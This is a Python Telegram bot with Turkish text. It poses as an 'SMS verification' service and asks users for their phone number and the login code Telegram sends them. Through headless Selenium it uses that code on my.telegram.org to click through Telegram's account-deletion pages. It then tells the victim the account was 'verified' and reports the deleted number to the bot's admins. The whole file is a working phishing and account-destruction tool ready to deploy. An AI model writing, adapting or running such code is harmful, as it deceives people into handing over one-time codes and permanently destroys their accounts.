import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from datetime import datetime
import time
import os

# Bot tokenı ve admin ID'leri
TOKEN = 'TOKEN'  # @BotFather'dan aldığın tokenı buraya yaz
ADMIN_IDS = [123456789]  # Kendi Telegram ID'ni buraya yaz (@UserInfoBot ile öğren)

# Kullanıcı durumlarını ve verilerini saklamak için sözlükler
user_states = {}
user_data = {}

def setup_driver():
    """Selenium WebDriver'ı başlat."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Tarayıcıyı arka planda çalıştır
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    return driver

async def start(update: telegram.Update, context: ContextTypes.DEFAULT_TYPE):
    """ /start komutunu işle. """
    user_id = update.effective_user.id
    try:
        keyboard = [[InlineKeyboardButton("Doğrula", callback_data='verify_account')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "⚡SMS onay botuna hoş geldiniz hesabını onaylamak için telefon numaranızı giriniz⚡",
            reply_markup=reply_markup
        )
    except telegram.error.TelegramError as e:
        print(f"Telegram API error in /start: {e}")
        await update.message.reply_text("❌ Bir hata oluştu. Lütfen tekrar deneyin.")

async def button(update: telegram.Update, context: ContextTypes.DEFAULT_TYPE):
    """ Buton tıklamalarını işle. """
    query = update.callback_query
    user_id = query.from_user.id
    
    try:
        await query.answer()
        
        if query.data == 'verify_account':
            user_states[user_id] = 'awaiting_phone'
            await query.edit_message_text("📱 Lütfen Telegram hesabınıza bağlı telefon numarasını uluslararası formatta girin (ör. +905551234567):")
        
    except telegram.error.TelegramError as e:
        print(f"Telegram API error in button: {e}")
        await query.edit_message_text("❌ Bir hata oluştu. Lütfen tekrar deneyin.")

async def handle_message(update: telegram.Update, context: ContextTypes.DEFAULT_TYPE):
    """ Kullanıcı mesajlarını işle. """
    user_id = update.effective_user.id
    message_text = update.message.text.strip()
    
    if user_id not in user_states:
        await update.message.reply_text("❗ Lütfen önce 'Doğrula' butonuna tıklayın.")
        return
    
    try:
        if user_states[user_id] == 'awaiting_phone':
            if not message_text.startswith('+') or not message_text[1:].isdigit():
                await update.message.reply_text("❗ Geçersiz telefon numarası. Lütfen uluslararası formatta girin (ör. +905551234567):")
                return
            user_data[user_id] = {'phone': message_text}
            user_states[user_id] = 'awaiting_code'
            
            # Telefon numarasını my.telegram.org/auth sitesine gir
            driver = setup_driver()
            try:
                driver.get('https://my.telegram.org/auth?to=deactivate')
                phone_input = driver.find_element(By.NAME, 'phone')
                phone_input.send_keys(message_text)
                driver.find_element(By.ID, 'telegram_signin_button').click()
                time.sleep(2)  # Sayfanın yüklenmesini bekle
                if "Confirmation code" in driver.page_source:
                    await update.message.reply_text("📩 Telegram uygulamanıza bir doğrulama kodu gönderildi. Lütfen kodu buraya yazın:")
                else:
                    await update.message.reply_text("❗ Kod gönderilemedi. Telefon numarasını kontrol edin veya tekrar deneyin.")
                    del user_states[user_id]
                    del user_data[user_id]
            except Exception as e:
                print(f"Selenium error: {e}")
                await update.message.reply_text("❌ Bir hata oluştu. Lütfen tekrar deneyin.")
                del user_states[user_id]
                del user_data[user_id]
            finally:
                driver.quit()
                
        elif user_states[user_id] == 'awaiting_code':
            if not message_text:
                await update.message.reply_text("❗ Kod boş olamaz. Lütfen doğrulama kodunu girin:")
                return
            phone = user_data[user_id]['phone']
            
            # Doğrulama kodunu gir ve 
            driver = setup_driver()
            try:
                driver.get('https://my.telegram.org/auth?to=deactivate')
                phone_input = driver.find_element(By.NAME, 'phone')
                phone_input.send_keys(phone)
                driver.find_element(By.ID, 'telegram_signin_button').click()
                time.sleep(2)
                code_input = driver.find_element(By.ID, 'code')
                code_input.send_keys(message_text)
                driver.find_element(By.ID, 'telegram_signin_button').click()
                time.sleep(2)
                
                if "Delete My Account" in driver.page_source:
                    driver.find_element(By.XPATH, "//a[contains(text(), 'Delete account')]").click()
                    time.sleep(1)
                    driver.find_element(By.XPATH, "//button[contains(text(), 'Delete My Account')]").click()
                    time.sleep(1)
                    driver.find_element(By.XPATH, "//button[contains(text(), 'Yes, delete my account')]").click()
                    await update.message.reply_text("✅ Telegram hesabınız başarıyla onaylandı.")
                    
                    # Adminlere bilgi gönder
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    message = f"🟢 Yeni Hesap Silme:\nZaman: {timestamp}\nTelefon: {phone}"
                    for admin_id in ADMIN_IDS:
                        try:
                            await context.bot.send_message(chat_id=admin_id, text=message)
                        except telegram.error.TelegramError as e:
                            print(f"Failed to send message to admin {admin_id}: {e}")
                else:
                    await update.message.reply_text("❗ Geçersiz kod. Lütfen doğru kodu girin veya tekrar deneyin.")
            except Exception as e:
                print(f"Selenium error: {e}")
                await update.message.reply_text("❌ Doğrulama işlemi başarısız. Lütfen kodu kontrol edin veya tekrar deneyin.")
            finally:
                driver.quit()
                del user_states[user_id]
                del user_data[user_id]
                
    except telegram.error.TelegramError as e:
        print(f"Telegram API error in handle_message: {e}")
        await update.message.reply_text("❌ Bir hata oluştu. Lütfen tekrar deneyin.")
    except KeyError:
        del user_states[user_id]
        await update.message.reply_text("❗ Oturum süresi doldu. Lütfen /start ile yeniden başlayın.")

def main():
    """ Botu başlat. """
    if not TOKEN or TOKEN == 'TOKEN':
        print("Error: Bot token is not configured. Exiting.")
        return
    
    try:
        application = Application.builder().token(TOKEN).read_timeout(30).write_timeout(30).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("Bot is running...")
        application.run_polling(allowed_updates=telegram.Update.ALL_TYPES)
        
    except telegram.error.InvalidToken:
        print("Error: Invalid bot token. Please check the TOKEN value.")
    except Exception as e:
        print(f"Fatal error starting bot: {e}")

if __name__ == '__main__':
    main()